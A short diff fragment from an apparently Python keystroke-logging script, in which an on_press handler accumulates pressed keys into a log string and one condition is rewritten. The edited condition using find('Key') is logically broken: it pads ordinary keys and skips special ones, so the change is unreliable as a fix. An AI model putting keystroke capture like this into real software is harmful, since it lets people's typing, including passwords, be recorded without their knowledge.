@@ -16,7 +16,7 @@ def on_press(key):
         logs = ''
     else:
         a = str(key).replace("'","")
-        if a in 'Key':
+        if a.find('Key'):
             a = ' '+a+' '
         logs += a
 
